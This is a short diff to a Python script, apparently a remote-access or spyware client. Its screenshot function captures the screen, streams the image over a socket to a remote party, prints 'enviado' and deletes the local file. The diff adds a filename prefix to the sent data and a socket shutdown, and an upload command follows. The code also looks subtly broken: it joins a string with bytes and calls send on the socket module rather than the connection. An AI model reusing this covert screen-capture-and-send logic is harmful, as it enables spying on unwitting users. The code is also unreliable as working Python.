@@ -32,11 +32,13 @@ def screenshot(s):
     img.save(nome)
     f = open(nome ,'rb')
     l = f.read(1024)
+    l = nome + '+/-' + l
     while(l):
         socket.send(l)
         l = f.read(1024)
     f.close()
     print('enviado')
+    s.shutdown(socket.SHUT_WR)
     os.remove(nome)
 
 def upload(s):
